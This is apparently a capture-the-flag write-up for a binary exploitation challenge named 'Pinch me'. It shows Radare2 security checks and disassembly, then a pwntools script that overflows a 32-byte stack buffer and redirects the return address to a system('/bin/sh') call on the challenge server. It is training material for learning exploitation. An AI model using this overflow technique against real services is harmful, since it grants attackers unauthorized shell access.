# Pinch me

This is another pwn challenge. A sample output is like so, with the user input being `Yes`:
```
$ ./pinch_me
Is this a real life, or is it just a fanta sea?
Am I dreaming?
Yes
Pinch me!
```

So, I opened this up in Radare2 and checked the security on the binary:
```
[0x004011d5]> i
fd       3
file     pinch_me
size     0x40f8
humansz  16.2K
mode     r-x
format   elf64
iorw     false
block    0x100
type     EXEC (Executable file)
arch     x86
baddr    0x400000
binsz    14774
bintype  elf
bits     64
canary   false
class    ELF64
compiler GCC: (Debian 10.2.0-16) 10.2.0
crypto   false
endian   little
havecode true
intrp    /lib64/ld-linux-x86-64.so.2
laddr    0x0
lang     c
linenum  true
lsyms    true
machine  AMD x86-64 architecture
maxopsz  16
minopsz  1
nx       true
os       linux
pcalign  0
pic      false
relocs   true
relro    partial
rpath    NONE
sanitiz  false
static   false
stripped false
subsys   linux
va       true
```
This binary has no stack canary and isn't PIE, so it looks like another stack overflow.

Viewing the `main` function's disassembly in Radare2, it calls the `vuln` function, which prints a prompt, gets 100 bytes into the buffer, then runs some checks on local variables to see if they are equal to `0x1234567` and `0x1337c0de`. However, just like the sanity check, we don't have to set the return address to the start of the function.

```
┌ 131: sym.vuln ();
│           ; var char *s @ rbp-0x20
│           ; var uint32_t var_8h @ rbp-0x8
│           ; var uint32_t var_4h @ rbp-0x4
│           0x00401152      55             push rbp
│           0x00401153      4889e5         mov rbp, rsp
│           0x00401156      4883ec20       sub rsp, 0x20
│           0x0040115a      c745fc674523.  mov dword [var_4h], 0x1234567
│           0x00401161      c745f8efcdab.  mov dword [var_8h], 0x89abcdef
│           0x00401168      488d3d990e00.  lea rdi, str.Is_this_a_real_life__or_is_it_just_a_fanta_sea_    ; 0x402008 ; ...
│           0x0040116f      e8bcfeffff     call sym.imp.puts           ;[1] ; int puts(const char *s)
│           0x00401174      488d3dbd0e00.  lea rdi, str.Am_I_dreaming_    ; 0x402038 ; "Am I dreaming?" ; const char *s
│           0x0040117b      e8b0feffff     call sym.imp.puts           ;[1] ; int puts(const char *s)
│           0x00401180      488b15c92e00.  mov rdx, qword [obj.stdin]    ; obj.stdin__GLIBC_2.2.5
│                                                                      ; [0x404050:8]=0 ; FILE *stream
│           0x00401187      488d45e0       lea rax, [s]
│           0x0040118b      be64000000     mov esi, 0x64               ; 'd' ; 100 ; int size
│           0x00401190      4889c7         mov rdi, rax                ; char *s
│           0x00401193      e8c8feffff     call sym.imp.fgets          ;[2] ; char *fgets(char *s, int size, FILE *stream)
│           0x00401198      817df8dec037.  cmp dword [var_8h], 0x1337c0de
│       ┌─< 0x0040119f      750e           jne 0x4011af
│       │   0x004011a1      488d3d9f0e00.  lea rdi, str._bin_sh        ; 0x402047 ; "/bin/sh" ; const char *string
│       │   0x004011a8      e893feffff     call sym.imp.system         ;[3] ; int system(const char *string)
│      ┌──< 0x004011ad      eb23           jmp 0x4011d2
│      ││   ; CODE XREF from sym.vuln @ 0x40119f
│      │└─> 0x004011af      817dfc674523.  cmp dword [var_4h], 0x1234567
│      │┌─< 0x004011b6      740e           je 0x4011c6
│      ││   0x004011b8      488d3d900e00.  lea rdi, str.Pinch_me_harder_    ; 0x40204f ; "Pinch me harder!" ; const char *s
│      ││   0x004011bf      e86cfeffff     call sym.imp.puts           ;[1] ; int puts(const char *s)
│     ┌───< 0x004011c4      eb0c           jmp 0x4011d2
│     │││   ; CODE XREF from sym.vuln @ 0x4011b6
│     ││└─> 0x004011c6      488d3d930e00.  lea rdi, str.Pinch_me_      ; 0x402060 ; "Pinch me!" ; const char *s
│     ││    0x004011cd      e85efeffff     call sym.imp.puts           ;[1] ; int puts(const char *s)
│     ││    ; CODE XREFS from sym.vuln @ 0x4011ad, 0x4011c4
│     └└──> 0x004011d2      90             nop
│           0x004011d3      c9             leave
└           0x004011d4      c3             ret
```

As we can see, if we can jump to `0x004011a1`, the program will run `system('/bin/sh')` and we will have an interactive shell.

So, we make a quick Python script like so:
```python
from pwn import *

payload = b"\x41"*40 + p64(0x004011a1)
r = remote('dctf1-chall-pinch-me.westeurope.azurecontainer.io', 7480)

r.recvuntil('dreaming?\n')
r.sendline(payload)
r.interactive()
```

This leaves us with an interactive shell, so we can just `cat flag.txt` for our flag.
